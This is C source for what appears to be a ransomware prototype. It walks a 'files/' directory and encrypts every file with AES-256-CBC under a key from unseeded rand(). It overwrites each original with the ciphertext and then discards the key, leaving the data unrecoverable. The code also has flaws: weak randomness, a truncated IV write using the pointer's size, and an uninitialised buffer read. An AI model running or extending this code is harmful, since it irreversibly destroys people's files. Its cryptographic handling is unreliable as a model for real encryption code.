#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/evp.h> // use openssl evp for encryption
#include <openssl/err.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

void encrypt(unsigned char *key, char *fileName) {
    // AES Encryption parameters
    int block_size = 16; // AES uses 128-bit block size encryption
    EVP_CIPHER_CTX *ctx;
    ctx = EVP_CIPHER_CTX_new(); // New ctx cipher
    
    unsigned char *iv = malloc(16); // IV is always 16 bytes
    // Generate the IV
    size_t i;
    for (i = 0; i < 16; i++) {
         iv[i] = rand();
    }

    // Initiate cipher and store key/iv in it
    EVP_CipherInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv, 1);

    // Buffer paramters
    unsigned char buffer[1024];
    unsigned char buffer_out[1024 + block_size];

    // File information -- only one for testing right now
    FILE *temp_output, *curr_file;
    char fileTemp[] = "temp_file.txt";

    // Read the binaries of the current file
    curr_file = fopen(fileName, "rb");
    temp_output = fopen(fileTemp, "wb");
    printf("%s\n", fileName);
    // Read in the current file into blocks
    int bytes_read, out_len;
    while(1) {
        bytes_read = fread(buffer, sizeof(unsigned char), 1024, curr_file);
        EVP_CipherUpdate(ctx, buffer_out, &out_len, buffer, bytes_read);
        fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
        if (bytes_read < 1024) {
            break;
        }
    }

    // Cipher the block 
    EVP_CipherFinal_ex(ctx, buffer_out, &out_len);
    fwrite(buffer_out, sizeof(unsigned char), out_len, temp_output);
    EVP_CIPHER_CTX_cleanup(ctx);
    fclose(temp_output);
    
    // Append the IV to the file for decryption later
    temp_output = fopen(fileTemp, "a");
    fwrite(iv, sizeof(unsigned char), sizeof(iv), temp_output);
    fclose(temp_output);

    // Close the file when encryption is complete
    fclose(curr_file);
    remove(fileName); // Delete the current file
    rename(fileTemp, fileName); // Rename our temp to override the current file even if it wasn't deleted
}

int main () {
    // Our cipher parameters
    int num_bytes = 32; // 256-bit key size
    unsigned char *key = malloc(num_bytes);
    char fileName[256];
    // Our directory structure
    DIR *users;
    struct dirent *entry;

    // Generate the key
    size_t i;
    for (i = 0; i < num_bytes; i++) {
         key[i] = rand();
    }
    char directory[] = "files/";
    char *pathLocation = malloc(strlen(directory) + strlen(fileName) + 1);
    users = opendir(directory);
    while( (entry=readdir(users)) )
    {
        strcpy(fileName, entry->d_name);
        strcpy(pathLocation, directory);
        strcat(pathLocation, fileName);
        if (!strcmp(fileName, ".") || !strcmp(fileName, "..")) {
            continue;
        } 
        // Call the encryption function to encrypt the files
        encrypt(key, pathLocation);
    }
    closedir(users);    
    // We don't like our keys being stored in the memory
    free(key);
    return 0;
}